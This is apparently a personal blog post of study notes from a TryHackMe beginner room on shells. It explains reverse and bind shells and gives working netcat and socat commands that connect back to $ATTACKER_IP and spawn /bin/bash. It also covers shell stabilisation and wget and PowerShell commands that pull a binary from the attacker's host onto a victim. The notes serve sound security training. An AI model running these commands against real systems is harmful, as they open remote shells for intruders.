---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-27 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-27-tryhackme-complete-beginner.html
author: 100007
---

<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2021-10-27</p>
<h1 id="what-the-shell">What the Shell?</h1>
<h2 id="what-is-a-shell">What Is a Shell?</h2>
<p>Terminology:</p>
<ul>
<li>REVERSE SHELLS are shells where the target is forced to connect back to the attacker.</li>
<li>BIND SHELLS are shells bound to a port on the target that the attacker can connect to later.</li>
</ul>
<h2 id="tools">Tools</h2>
<p>Typical tools for creating reverse shells or connecting to bind shells:</p>
<ul>
<li><code class="language-plaintext highlighter-rouge">netcat</code> (<code class="language-plaintext highlighter-rouge">nc</code>) is present on just about every UNIX-like system. It can do just about everything, but can be a little bit unstable when constructing reverse shells.</li>
<li><code class="language-plaintext highlighter-rouge">socat</code> is a more versatile, more stable netcat. Unfortunately, it is rarely installed out-of-the-box.</li>
<li><code class="language-plaintext highlighter-rouge">auxilary/multi/handler</code> is the netcat/socat equivalent in Metasploit. It is the only way to interact with the Meterpreter attack shell, and has built-in support for staged payloads.</li>
<li><code class="language-plaintext highlighter-rouge">msfvenom</code> is a stand-alone version of multi/handler. It can also generate reverse shell payloads.</li>
</ul>
<p>Useful sites:</p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payload All the Things</a></li>
<li><a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a></li>
</ul>
<p>Also check out /usr/share/webshells on Kali Linux.</p>
<ul>
<li><a href="https://cardboard-iguana.com/notes/metasploit.html">Using Metasploit</a></li>
</ul>
<h2 id="types-of-shells">Types of Shells</h2>
<p>Example reverse shell:</p>
<ul>
<li>Attacker: <code class="language-plaintext highlighter-rouge">nc -lvnp $LISTENER_PORT</code></li>
<li>Target: <code class="language-plaintext highlighter-rouge">nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash</code></li>
</ul>
<p>Example bind shell:</p>
<ul>
<li>Attacker: <code class="language-plaintext highlighter-rouge">nc $TARGET_IP $LISTENER_PORT</code></li>
<li>Target: <code class="language-plaintext highlighter-rouge">nc -lvnp $LISTENER_PORT -e /bin/bash</code></li>
</ul>
<p>These are almost, but not quite, mirror images of each other.</p>
<p>Most initial reverse shells (in particular web shells) are non-interactive.</p>
<h2 id="netcat">Netcat</h2>
<p>While binding to well-known ports requires the use of sudo, it’s also less likely to get flagged/blocked by intermediate firewalls.</p>
<h2 id="netcat-shell-stabilization">Netcat Shell Stabilization</h2>
<p>One thing that causes a reverse shell to be non-interactive is when its running in a shell itself. It’s generally possible to stabilize these and get a fully interactive shell on UNIX-like systems:</p>
<ul>
<li>Start an instance of bash connected to an actual PTY: <code class="language-plaintext highlighter-rouge">env TERM=xterm python -c 'import pty; pty.spawn("/bin/bash")'</code></li>
<li>Suspend the reverse shell.</li>
<li>Use <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code> to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.</li>
</ul>
<p>Note that the <code class="language-plaintext highlighter-rouge">stty</code> command can be canceled using <code class="language-plaintext highlighter-rouge">reset</code> (after closing the reverse shell). Since echo is turned off, typing this won’t be visible. Trust the force!</p>
<p>You can <em>mostly</em> bypass the need for the <code class="language-plaintext highlighter-rouge">stty</code> command by using <code class="language-plaintext highlighter-rouge">rlwrap</code>, which sets all of this up for you (though it doesn’t redirect control sequences, so Ctrl+C will still kill the connection).</p>
<p>It’s also possible to upgrade to a socat-powered shell, assuming that you have a statically-compiled version of socat. Typically, the way that you’d transfer this binary is by first spinning up a simply webserver in the directory with your socat binary on the attack machine, and then downloading that binary to the vicitim.</p>
<ul>
<li>UNIX LIKE: <code class="language-plaintext highlighter-rouge">wget $ATTACKER_IP/socat -O /tmp/socat</code></li>
<li>WINDOWS (POWERSHELL): <code class="language-plaintext highlighter-rouge">Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\Windows emp\socat.exe</code></li>
</ul>
<p>NOTE that in <em>none</em> of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using <code class="language-plaintext highlighter-rouge">stty rows</code> and <code class="language-plaintext highlighter-rouge">stty cols</code>.</p>
<ul>
<li><a href="https://cardboard-iguana.com/notes/quick-n-dirty-python-web-server.html">Quick-n-Dirty Python Web Server</a></li>
</ul>
<h2 id="socat">Socat</h2>
<p>Socat: Just an anything-to-anything connector!</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse shell (attacker)</span>
<span class="c">#</span>
nc <span class="nt">-lnp</span> <span class="nv">$LISTENER_PORT</span>
socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> -
<span class="c"># Reverse shell (target)</span>
<span class="c">#</span>
nc <span class="nv">$ATTACKER_IP</span> <span class="nv">$LISTENER_PORT</span> <span class="nt">-e</span> /bin/bash
socat TCP:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span> EXEC:<span class="s2">"/bin/bash -li"</span>
<span class="c"># Bind shell (attacker)</span>
<span class="c">#</span>
nc <span class="nv">$TARGET_IP</span> <span class="nv">$LISTENER_PORT</span>
socat TCP:<span class="nv">$TARGET_IP</span>:<span class="nv">$LISTENER_PORT</span>
<span class="c"># Bind shell (target)</span>
<span class="c">#</span>
nc <span class="nt">-lnp</span> <span class="nv">$LISTENER_PORT</span> <span class="nt">-e</span> /bin/bash
socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> EXEC:<span class="s2">"/bin/bash -li"</span>
</code></pre></div></div>
<p>This gets us an interactive login shell right out the gate, though we’re still vulnerable to Ctrl+C. Note that when binding to PowerShell, use <code class="language-plaintext highlighter-rouge">powershell.exe,pipes</code> in order to force PowerShell to use UNIX-style STDIN/STDOUT.</p>
<p>We can use socat to create an auto-stabilized reverse shell on UNIX-like systems (though we will still need to use <code class="language-plaintext highlighter-rouge">stty</code> to set rows/columns).</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker: Connect $LISTENER_PORT to the current TTY,</span>
<span class="c"># send raw keycodes, and turn off terminal echo.</span>
<span class="c"># Basically the `stty raw -echo`.</span>
<span class="c">#</span>
socat TCP-LISTEN:<span class="nv">$LISTENER_PORT</span> FILE:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0
<span class="c"># Target: Connect the listener on the attacker to an</span>
<span class="c"># interactive login bash shell.</span>
<span class="c">#</span>
<span class="c"># pty - allocate a PTTY</span>
<span class="c"># stderr - redirect STDERR to the attacker</span>
<span class="c"># sigint - pass signals (Ctrl+C) through</span>
<span class="c"># setsid - use a new session</span>
<span class="c"># sane - use a variety of tweaks to "normalize" the</span>
<span class="c"># terminal's environment</span>
<span class="c">#</span>
socat TCP:<span class="nv">$ATTACKER_IP</span>:<span class="nv">$LISTENER_PORT</span> <span class="se">\</span>
EXEC:<span class="s2">"/bin/bash -li"</span>,pty,stderr,sigint,setsid,sane
</code></pre></div></div>
<p>NOTE that it’s perfectly acceptable to kick off a socat process from inside a netcat process!</p>